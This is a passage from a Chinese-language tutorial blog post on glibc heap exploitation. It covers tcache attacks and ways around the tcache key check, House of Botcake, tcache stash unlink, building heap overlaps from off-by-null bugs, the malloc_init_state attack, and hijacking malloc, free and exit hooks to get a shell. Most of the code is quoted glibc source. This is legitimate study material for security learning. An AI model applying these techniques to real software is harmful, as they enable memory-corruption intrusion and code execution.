                     lazyload
                     src="/images/loading.svg"
                     data-src="images/da17c26dc9c6da24b5f8be1fe7d597e4.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
glibc-2.29 开始增加了 tcache key 来检测 double free 。

<p>glibc-2.30 之后逻辑变了，原来是判断 <code>entry[idx]!=NULL</code>，glibc-2.30 之后判断 <code>count[idx] &gt; 0</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc ≥ 2.30</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// glibc &lt; 2.30</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><p>free 两次之后再 malloc 效果等同于 uaf ，可以进行 tcache poisoning 。</p>
<h2 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h2><p>通过 tcache poisoning malloc 到 tcache_perthread_struct 就可以控制整个 tcache 。 </p>
<h2 id="House-of-IO"><a href="#House-of-IO" class="headerlink" title="House of IO"></a>House of IO</h2><p>其实就是对 <code>tcache_perthread_struct</code> 结构体的攻击，想办法将其释放掉，然后再申请回来，申请回来的时候就能控制整个 tcache 的分配。</p>
<h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h2><p>构造一个 fake chunk free 然后再 malloc 出来从而控制该区域内存。fake chunk 只需要确保 size 在 tcache 范围即可。</p>
<h2 id="tcache-extend"><a href="#tcache-extend" class="headerlink" title="tcache extend"></a>tcache extend</h2><p>修改 chunk 的 size 然后释放并重新申请出来就可以造成堆块重叠。</p>
<h2 id="tcache-key"><a href="#tcache-key" class="headerlink" title="tcache key"></a>tcache key</h2><p>自 glibc2.29 版本起 tcache 新增了一个 key 字段，该字段位于 chunk 的 bk 字段，值为 tcache 结构体的地址，若 free() 检测到 chunk-&gt;bk &#x3D;&#x3D; tcache 则会遍历 tcache 查找对应链表中是否有该chunk。最新版本的一些老 glibc （如新版2.27等）也引入了该防护机制</p>
<h3 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h3><p>由于 tcache 用的是 fd 字段所在地址，因此可以通过泄露 tcache key 来泄露堆地址。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/f3ee9deabbdb7869c52545aad38e15e3.png"
                     
                ><br>glibc-2.34 开始，tcache 的 key 不再是 <code>tcache_pthread_struct</code> 结构体地址，而是一个随机数 <code>tcache_key</code> ，因此不能通过 key 泄露堆地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc-2.33</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// glibc-2.34</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="tcache-key-bypass"><a href="#tcache-key-bypass" class="headerlink" title="tcache key bypass"></a>tcache key bypass</h3><p>在进行 tcache double free 之前，还需要想办法绕过 tcache key 的保护。<br>常见的 tcache key bypass 手段如下：</p>
<ul>
<li>清除 tcache key：通过一些 UAF 手段将该 free chunk 中记录的 tcache key清除，从而绕过该检测。</li>
<li>house of kauri：通过修改 size 使两次 free 的同一块内存进入不同的 entries 。</li>
<li>tcache stash with fastbin double free：在 fastbin 中并没有严密的 double free 检测，我们可以在填满对应的 tcache 链条后在 fastbin 中完成 double free，随后通过 stash 机制将 fastbin 中 chunk 倒回 tcache 中。此时 fsat bin double free 就变成了 tcahce double free 。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9c209e59493f988b7dfe2e318e190b0f.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></li>
<li>House of Botcake<br>同一个 chunk 释放到 tcache 和 unsorted bin 中。释放在 unsorted bin 的 chunk 借助堆块合并改变大小。相对于上一个方法，这个方法的好处是一次 double free 可以多次使用，因为控制同一块内存的 chunk 大小不同。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/b207a8da6850d0f762e962c9e75adc7e.png"
                     
                ></li>
</ul>
<h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><p>calloc 申请内存不会从 tcache 中获取，而是从 fast bin 中获取。取完后，会将 fast bin 中的 chunk 放入 tcache 中。如果修改 fast bin 中 chunk 的 fd 指针，则会在 fd + 0x10 地址处写入一个较大的值。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/637c7090884f4df60e1d3a15046d2725.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>如果是使用 malloc 可以先消耗完 tcache 中的 chunk 然后再触发 stash 机制完成攻击。不过为了防止 target 的 fd 指向无效地址，需要在 fast bin 中预留另外 6 个 chunk 来填满  tcache 。</p>
<h2 id="tcache-stash-unlink"><a href="#tcache-stash-unlink" class="headerlink" title="tcache stash unlink"></a>tcache stash unlink</h2><p>从 small bin 中取出 chunk  时会对该 chunk 的 bk 指向的 chunk 的 fd 进行检查：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">idx = smallbin_index (nb);</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">  &#123;</span><br><span class="line">	bck = victim-&gt;bk;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	  malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">	set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">	bin-&gt;bk = bck;</span><br><span class="line">	bck-&gt;fd = bin;</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></div>

<p>但是最后将 small bin 中剩余 chunk 放入 tcache 直到 tcache 填满的过程却不会进行检查。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line"><span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">	&amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">			bck = tc_victim-&gt;bk;</span><br><span class="line">			set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">			<span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">			bin-&gt;bk = bck;</span><br><span class="line">			bck-&gt;fd = bin;</span><br><span class="line">			</span><br><span class="line">			tcache_put (tc_victim, tc_idx);</span><br><span class="line">	     &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此可以采用下面的方法进行攻击：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f6bbea45f67322f88f6985d6df043863.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<ul>
<li>small bin 放两个 chunk 是为了绕过第一次从 small bin 取 chunk 时的检查。</li>
<li>tcache 放 5 个 chunk 并 calloc 申请内存既可以保证 两次 stash 将 fake chunk1 申请出来，同时确保 stash 次数不会过多造成访存错误。</li>
<li>tcache stash unlink 最终效果是任意地址 malloc 和任意地址写某个（些）值。</li>
</ul>
<h1 id="Heap-Overlapping"><a href="#Heap-Overlapping" class="headerlink" title="Heap Overlapping"></a>Heap Overlapping</h1><p>这里的堆块重叠指的是指让一个堆块能控制另一个堆块的头部，而不是只能控制内存区域，这个条件比普通的 UAF 要强很多。</p>
<h2 id="UAF-转-Heap-Overlapping"><a href="#UAF-转-Heap-Overlapping" class="headerlink" title="UAF 转 Heap Overlapping"></a>UAF 转 Heap Overlapping</h2><p>以 fast bin attack 为例，在堆块的内存区域伪造 chunk 的 size 然后利用 UAF 部分地址写将 fd 修改到伪造的 chunk 头部，之后将 fake chunk 申请出来就可以造成堆块重叠。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/854710cc188652cf94c06c8e819cf87d.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                ></p>
<h2 id="Off-by-Null-转-Heap-Overlapping"><a href="#Off-by-Null-转-Heap-Overlapping" class="headerlink" title="Off by Null 转 Heap Overlapping"></a>Off by Null 转 Heap Overlapping</h2><p>off by null 比 off by one 条件要弱一些，所以这里只介绍 off by null 制造堆块重叠的方法。</p>
<p>如果是在输入的内容后面一个字节写 0 ，即可以控制下一个 chunk 的 prev_size 和 size 最低 1 字节写 0 那么可以采用下面的方法制造堆块重叠。</p>
<p>如下图所示，释放 chunk1 然后修改 chunk3 的 prev_size 和 PREV_INUSE 位（顺序不能错，否则 chunk1 会与 chunk2 合并出错），之后释放 chunk3 与 chunk1 合并，从而造成堆块重叠。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/893de62bdf917eabe9aab788d640fccf.png"
                     
                ><br>如果不是在输入的内容后面一个字节写 0 ，即在下一个 chunk 的 size 最低 1 字节写 0 但不能控制 prev_size 时可以采用下面的构造方法。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/ab55d3ac8513419241df7d2a51681968.png"
                     
                ></p>
<p>如果不能释放和申请 tcache&#x2F;fastbin 范围之外的 chunk 则可以构造如下结构，通过 <code>scanf(&quot;%d&quot;, &amp;id)</code> 时输入过长的字符串调用产生如下调用栈来申请 unsorted bin 范围的堆块触发 <code>malloc_consolidate</code> 实现堆块合并，最终造成堆块重叠。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">0</span>  __GI___libc_malloc (bytes=bytes@entry=<span class="number">2048</span>) at malloc.c:<span class="number">3287</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00007fd0f0c1e950</span> in __GI___libc_scratch_buffer_grow_preserve (buffer=buffer@entry=<span class="number">0x7ffe7fa7f130</span>) at scratch_buffer_grow_preserve.c:<span class="number">37</span></span><br><span class="line">#<span class="number">2</span>  <span class="number">0x00007fd0f0bdfca2</span> <span class="function">in <span class="title">scratch_buffer_grow_preserve</span> <span class="params">(buffer=&lt;optimized out&gt;)</span> at ../include/scratch_buffer.h:<span class="number">113</span></span></span><br><span class="line"><span class="function">#<span class="number">3</span>  char_buffer_add_slow (buffer=</span>buffer@entry=<span class="number">0x7ffe7fa7f120</span>, ch=&lt;optimized out&gt;) at vfscanf-internal.c:<span class="number">241</span></span><br><span class="line">#<span class="number">4</span>  <span class="number">0x00007fd0f0be04c7</span> in <span class="built_in">char_buffer_add</span> (ch=&lt;optimized out&gt;, buffer=<span class="number">0x7ffe7fa7f120</span>) at vfscanf-internal.c:<span class="number">261</span></span><br><span class="line">#<span class="number">5</span>  __vfscanf_internal (s=&lt;optimized out&gt;, format=&lt;optimized out&gt;, argptr=argptr@entry=<span class="number">0x7ffe7fa7f588</span>, mode_flags=mode_flags@entry=<span class="number">2</span>) at vfscanf-internal.c:<span class="number">1797</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00007fd0f0bdf495</span> in __isoc99_scanf (format=&lt;optimized out&gt;) at isoc99_scanf.c:<span class="number">30</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/2986f7661220e9475b8e0217f1db80d5.png"
                     
                ><br>自 glibc-2.29 起加入了 prev_size 的检查，以上方法均已失效。不过要是能够泄露堆地址可以利用 unlink 或 house of  einherjar 的思想伪造 fd 和 bk 实现堆块重叠。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="新版本-Off-by-Null-不泄露堆地址构造-Heap-Overlapping"><a href="#新版本-Off-by-Null-不泄露堆地址构造-Heap-Overlapping" class="headerlink" title="新版本 Off by Null 不泄露堆地址构造 Heap Overlapping"></a>新版本 Off by Null 不泄露堆地址构造 Heap Overlapping</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>首先构造两个 small bin 中的 chunk 和一个 large bin 中的 chunk 。然后将其申请出来，通过部分覆盖修改指针为下图所示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/d59d0c9655872fabb9e32b530848af60.png"
                     
                ><br>之后通过 off by one 把 chunk3 改小放入 fast bin（或 off by null 进 tcache） ，然后通过部分写将 chunk3 的 fd 指向自己，此时 fake chunk 满足 house of einherjar 条件，可以实现堆块重叠。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/2d469bb6521432ee01c21d104363129d.png"
                     
                ></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>首先采用如下方法伪造出 fake chunk 的 fd 和 bk 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/1afc6f5a794f6acc5eec616d5384ab27.png"
                     
                ><br>之后利用 unsorted bin 伪造 chunk1 的 bk 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/658833a8d7e5dbd8a57c6e195035b286.png"
                      alt="在这里插入图片描述"  
                ><br>由于 unsorted bin 是从 bk 开始取的，不能通过 unsorted bin 来修改 chunk6 的 fd ，因此这里借助 large bin 和部分覆盖来伪造 chunk6 的 fd 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/370edc3263869c638021d42e2174f203.png"
                     
                ></p>
<p>至此 fake chunk 满足 house of einherjar 条件，可以实现堆块重叠。</p>
<h1 id="malloc-init-state-attack"><a href="#malloc-init-state-attack" class="headerlink" title="malloc_init_state attack"></a>malloc_init_state attack</h1><p>malloc_consolidate 会根据 global_max_fast 是否为 0 来判断 ptmalloc 是否已经初始化，因此如果能通过任意地址写将 global_max_fast 置 0 然后触发 malloc_consolidate 就可以调用 malloc_init_state 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// malloc_consolidate逻辑</span></span><br><span class="line"><span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//global_max_fast不为0,表示ptmalloc已经初始化</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//如果global_max_fast为0</span></span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">    <span class="comment">//非debug模式下该宏定义为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 malloc_init_state 中会将 top chunk 指针指向 unsorted bin</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    mbinptr bin;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) &#123;</span><br><span class="line">        bin = bin_at (av, i);</span><br><span class="line">        bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">        <span class="comment">//遍历所有的bins,初始化每个bin的空闲链表为空,即将bin的fb和bk都指向bin本身</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        set_noncontiguous (av);</span><br><span class="line">        <span class="comment">//对于非主分配区,需要设置为分配非连续虚拟地址空间</span></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">        set_max_fast (DEFAULT_MXFAST);</span><br><span class="line">        <span class="comment">//设置fastbin中最大chunk大小</span></span><br><span class="line">        <span class="comment">//只要该全局变量的值非0,也就意味着主分配区初始化了</span></span><br><span class="line">    av-&gt;flags |= FASTCHUNKS_BIT;</span><br><span class="line">    <span class="comment">//标识此时分配区无fastbin</span></span><br><span class="line">    av-&gt;top = initial_top (av);</span><br><span class="line">    <span class="comment">//#define initial_top(M) (unsorted_chunks(M))</span></span><br><span class="line">    <span class="comment">//#define unsorted_chunks(M) (bin_at(M, 1))</span></span><br><span class="line">    <span class="comment">//#define bin_at(m, i) (mbinptr)(((char *) &amp;((m)-&gt;bins[((i) - 1) * 2])) - offsetof (struct malloc_chunk, fd))</span></span><br><span class="line">    <span class="comment">//暂时把top chunk初始化为unsort chunk,仅仅是初始化一个值而已,这个chunk的内容肯定不能用于top chunk来分配内存,主要原因是top chunk不属于任何bin,但ptmalloc中的一些check代码可能需要top chunk属于一个合法的bin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此时 top chunk 的地址为 &amp;av-&gt;bins[0] - 0x10 ，且 size 为之前的 last_remainder 的值(通常来说堆指针都会很大)，只要不断 malloc ，就可以分配到 hook 指针。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/62388e6733411c94dc97b9b86e5700f2.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>glibc-2.27 开始 malloc_consolidate 不再调用 malloc_init_state ，该方法失效。</p>
<h1 id="各种-HOOK"><a href="#各种-HOOK" class="headerlink" title="各种 HOOK"></a>各种 HOOK</h1><p>对利用最终获取 shell 的方式除了写 got 表外就是覆盖函数指针。glibc 中存在很多 hook 结构可以利用。</p>
<h2 id="malloc-hook-realloc-hook"><a href="#malloc-hook-realloc-hook" class="headerlink" title="malloc hook + realloc hook"></a>malloc hook + realloc hook</h2><p>调用代码如下，传入的参数是申请的字节数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">  = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>

<p>可以利用 fastbin attack 写入 onegadget 来 get shell 。具体利用见前面 fastbin 的 Arbitrary Alloc 中的介绍。</p>
<p>glibc-2.34 起删除了堆相关 hook 。</p>
<h2 id="free-hook"><a href="#free-hook" class="headerlink" title="free hook"></a>free hook</h2><p>调用代码如下，传入参数是释放的指针。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">  = atomic_forced_read (__free_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>free hook 前面没有可供截取的 size 字段（偶尔有，但是由于值一直在变因此没有成功利用），因此很难利用 fast bin attack 来攻击，不过可以利用 house of storm 或 tcache attack 攻击。<br>free hook 的优势是传入参数为释放的内存，因此参数可控，比如将 free hook 改为 system 然后释放带有 <code>/bin/sh</code> 的字符串可以稳定 get shell 。或者利用 setcontext 的 gadget 来设置寄存器来劫持程序执行流程。</p>
<p>glibc-2.34 起删除了堆相关 hook 。</p>
<h2 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit hook"></a>exit hook</h2><p>在 rtld_global 结构体中有 _dl_rtld_lock_recursive 和 _dl_rtld_unlock_recursive 两个函数指针。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">rtld_global</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined SHARED &amp;&amp; defined _LIBC_REENTRANT \</span></span><br><span class="line"><span class="meta">    &amp;&amp; defined __rtld_lock_default_lock_recursive</span></span><br><span class="line">  <span class="function">EXTERN <span class="title">void</span> <span class="params">(*_dl_rtld_lock_recursive)</span> <span class="params">(<span class="type">void</span> *)</span></span>;</span><br><span class="line">  <span class="function">EXTERN <span class="title">void</span> <span class="params">(*_dl_rtld_unlock_recursive)</span> <span class="params">(<span class="type">void</span> *)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>该函数指针指向的函数在 exit 中被调用<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/bac420de9c4efcbc96ed0f31fac496cc.png"
                     
                ></p>
